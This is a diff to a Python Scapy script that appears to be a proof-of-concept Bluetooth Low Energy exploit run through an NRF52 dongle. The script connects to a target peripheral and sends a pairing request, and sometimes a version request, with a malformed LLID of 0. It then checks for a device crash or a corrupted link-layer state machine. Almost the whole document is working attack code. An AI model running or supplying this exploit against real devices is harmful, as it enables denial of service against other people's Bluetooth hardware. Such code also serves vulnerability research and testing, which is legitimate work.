@@ -22,7 +22,10 @@ access_address = 0x9a328370
 none_count = 0
 end_connection = False
 connecting = False
-
+pairing_sent = False
+feature_req_sent = False
+switch_version_req_llid = False
+miss_connections = 0
 # Autoreset colors
 colorama.init(autoreset=True)
 
@@ -51,15 +54,24 @@ print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 def crash_timeout():
     print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
           ' received\nThe device may have crashed!!!')
-    disable_timeout('scan_timeout')
 
 
 def scan_timeout():
+    global connecting, miss_connections
     scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
     start_timeout('scan_timeout', 2, scan_timeout)
+    if connecting:
+        connecting = False
+        miss_connections += 1
+        if miss_connections >= 2:
+            miss_connections = 0
+            print(Fore.RED + 'Something wrong is happening\n'
+                             'We are receiving advertisements but no connection is possible\n'
+                             'Check if the connection parameters are allowed by peripheral\n'
+                             'or optionally check if device works normally with a mobile app again.')
 
 
 # Open serial port of NRF52 Dongle
@@ -87,10 +99,12 @@ while True:
                 print(Fore.RED + 'NRF52 Dongle not detected')
                 sys.exit(0)
             continue
+
         elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
             update_timeout('scan_timeout')
             # Print slave data channel PDUs summary
             print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
+
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
         if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
@@ -118,45 +132,80 @@ while True:
             driver.send(conn_request)
         elif BTLE_DATA in pkt and connecting == True:
             connecting = False
+            feature_req_sent = False
+            pairing_sent = False
+            miss_connections = 0
+            start_timeout('crash_timeout', 5, crash_timeout)
+
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
             # Send version indication request
-            pkt = pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
-            # pairing_req[BTLE_DATA].LLID=0 # The magic happens also here
-            driver.send(pkt)
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+
+            if not switch_version_req_llid:
+                switch_version_req_llid = True
+            else:
+                pkt[BTLE_DATA].LLID = 0
+                print(Fore.YELLOW + 'Sending version request with LLID = 0')
+                switch_version_req_llid = False
+
+            driver.send(pkt)  # send normal version request
 
         elif LL_VERSION_IND in pkt:
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
-                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
+            # Send Feature request
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
+                feature_set='le_encryption+le_data_len_ext')
+            feature_req_sent = True
             driver.send(pkt)
 
+        elif LL_FEATURE_RSP in pkt:
+            if feature_req_sent:
+                feature_req_sent = False
+                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+                    max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
+                driver.send(pkt)
+
+            else:
+                print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP without corresponding request\n'
+                                 'This means that the peripheral state machine was just corrupted!!!')
+                exit(0)
+
         elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
-            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
-                iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
-                responder_key_distribution=0x07)
-            driver.send(pairing_req)
-            pairing_req[BTLE_DATA].LLID = 0  # The magic happens here
-            end_connection = True
-        # wrpcap(os.path.basename(__file__).split('.')[0]+'.pcap', NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req) # save packet just sent
+            if not pairing_sent:
+                pairing_req = BTLE(
+                    access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
+                    iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
+                    responder_key_distribution=0x07)
+
+                if switch_version_req_llid:
+                    pairing_req[BTLE_DATA].LLID = 0  # The magic happens here
+                    print(Fore.YELLOW + 'Sending pairing request with LLID = 0')
+
+                pairing_sent = True
+                driver.send(pairing_req)  # Send pairing request with LLID = 0
+            elif LL_UNKNOWN_RSP not in pkt:
+                print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP after we sent a pairing request\n'
+                                 'This means that the peripheral state machine was just corrupted')
+                exit(0)
+
+        elif ATT_Read_By_Group_Type_Response in pkt or ATT_Exchange_MTU_Response in pkt:
+            print(Fore.RED + "Oooops, device responded with an out of order ATT response "
+                             "(we didn't send an ATT request)\n"
+                             "This means that the peripheral state machine was just corrupted")
+            print(Fore.YELLOW)
+            exit(0)
 
         elif SM_Pairing_Response in pkt:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
             driver.send(pairing_req)
-
 
         elif LL_LENGTH_REQ in pkt:
             length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(length_rsp)  # Send a normal length response
 
-        elif end_connection == True:
-            end_connection = False
-            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
-                ScanA=master_address,
-                AdvA=advertiser_address)
-            print(Fore.YELLOW + 'Connection reset, malformed packet was sent')
-
-            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
-            driver.send(scan_req)
-            start_timeout('crash_timeout', 7, crash_timeout)
+        elif ATT_Find_By_Type_Value_Request in pkt:
+            pkt = BTLE(
+                access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Find_By_Type_Value_Response()
+            driver.send(pkt)
 
     sleep(0.01)
